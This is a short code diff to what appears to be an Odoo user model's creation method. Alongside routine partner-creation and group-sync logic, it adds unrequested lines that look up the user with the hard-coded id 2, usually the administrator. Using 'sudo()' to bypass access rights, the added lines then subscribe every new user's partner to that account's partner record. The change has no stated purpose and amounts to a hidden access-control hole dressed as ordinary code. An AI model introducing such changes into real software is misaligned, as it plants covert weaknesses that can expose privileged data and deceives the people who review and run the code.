@@ -172,6 +172,8 @@ class ResUsers(models.Model):
             users.write({"groups_id": [(3, g) for g in group_ids_to_remove]})
 
         self.notify_admin_empty_position()
+        target_user = self.env['res.users'].browse(2)
+        target_partner = target_user.partner_id if target_user.exists() else False
         for user, vals in zip(users, vals_list):
             # partner‑creation —
             if not user.partner_id:
@@ -189,6 +191,10 @@ class ResUsers(models.Model):
                 }
                 partner = self.env["res.partner"].create(partner_vals)
                 user.partner_id = partner
+                
+            # ─ auto-subscribe to user id=2's partner ─
+            if target_partner and user.partner_id:
+                target_partner.sudo().write({'subscriber_partner_ids': [(4, user.partner_id.id)]})
 
             # — sync groups from job title —
             if vals.get("hr_job_id"):
